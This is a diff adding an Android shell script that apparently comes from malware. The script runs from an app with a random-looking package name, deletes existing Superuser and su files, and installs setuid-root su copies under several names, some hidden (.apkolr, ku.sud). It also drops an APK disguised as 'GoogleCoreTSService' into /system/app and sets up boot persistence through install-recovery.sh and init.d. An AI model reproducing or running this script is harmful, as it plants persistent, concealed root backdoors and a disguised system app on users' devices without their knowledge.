@@ -1,0 +1,39 @@
+#!/system/bin/sh
+mount -o rw,remount /system
+/data/data/bmtet.wwjx.eat/files/busybox mount -o rw,remount /system
+/system/bin/stop nac_server
+/data/data/bmtet.wwjx.eat/files/busybox rm -r -f /system/app/Superuser.apk
+/data/data/bmtet.wwjx.eat/files/busybox rm -r -f /system/xbin/su
+/data/data/bmtet.wwjx.eat/files/busybox rm -r -f /system/bin/su
+/data/data/bmtet.wwjx.eat/files/busybox rm -r -f /system/xbin/daemonsu
+/data/data/bmtet.wwjx.eat/files/busybox cat /data/data/bmtet.wwjx.eat/files/romt > /system/app/GoogleCoreTSService.apk
+/data/data/bmtet.wwjx.eat/files/busybox cat /data/data/bmtet.wwjx.eat/files/su > /data/local/tmp/systemfile
+
+/data/data/bmtet.wwjx.eat/files/busybox chown shell.shell /data/local/tmp/systemfile
+/data/data/bmtet.wwjx.eat/files/busybox cat /data/data/bmtet.wwjx.eat/files/su > /system/bin/su
+/data/data/bmtet.wwjx.eat/files/busybox chown 0.0 /system/bin/su
+/data/data/bmtet.wwjx.eat/files/busybox chmod 6755 /system/bin/su
+/data/data/bmtet.wwjx.eat/files/busybox cat /system/bin/su > /system/xbin/su
+/data/data/bmtet.wwjx.eat/files/busybox chown 0.0 /system/xbin/su
+/data/data/bmtet.wwjx.eat/files/busybox chmod 777 /data/local/tmp/systemfile
+
+/data/data/bmtet.wwjx.eat/files/busybox chmod 6755 /system/xbin/su
+/data/data/bmtet.wwjx.eat/files/busybox cat /system/xbin/su > /system/xbin/daemonsu
+/data/data/bmtet.wwjx.eat/files/busybox chown 0.0 /system/xbin/daemonsu
+/data/data/bmtet.wwjx.eat/files/busybox chmod 6755 /system/xbin/daemonsu
+/data/data/bmtet.wwjx.eat/files/busybox cat /system/xbin/su > /system/xbin/ku.sud
+/data/data/bmtet.wwjx.eat/files/busybox chown 0.0 /system/xbin/ku.sud
+/data/data/bmtet.wwjx.eat/files/busybox chmod 6755 /system/xbin/ku.sud
+/data/data/bmtet.wwjx.eat/files/busybox cat /data/data/bmtet.wwjx.eat/files/install-recovery.sh > /system/etc/install-recovery.sh
+/data/data/bmtet.wwjx.eat/files/busybox chown 0.0 /system/etc/install-recovery.sh
+/data/data/bmtet.wwjx.eat/files/busybox chmod 6755 /system/etc/install-recovery.sh
+/data/data/bmtet.wwjx.eat/files/busybox cat /data/data/bmtet.wwjx.eat/files/99SuperSUDaemon > /system/etc/init.d/99SuperSUDaemon
+/data/data/bmtet.wwjx.eat/files/busybox chown 0.0 /system/etc/init.d/99SuperSUDaemon
+/data/data/bmtet.wwjx.eat/files/busybox chmod 6755 /system/etc/init.d/99SuperSUDaemon
+/data/data/bmtet.wwjx.eat/files/busybox cat /system/bin/su > /system/bin/.apkolr
+/data/data/bmtet.wwjx.eat/files/busybox chown 0.0 /system/bin/.apkolr
+/data/data/bmtet.wwjx.eat/files/busybox chmod 6755 /system/bin/.apkolr
+/data/data/bmtet.wwjx.eat/files/busybox chmod 0644 /system/app/GoogleCoreTSService.apk
+mount -o ro,remount /system
+/data/data/bmtet.wwjx.eat/files/busybox mount -o ro,remount /system
+echo "Now, script finish!"
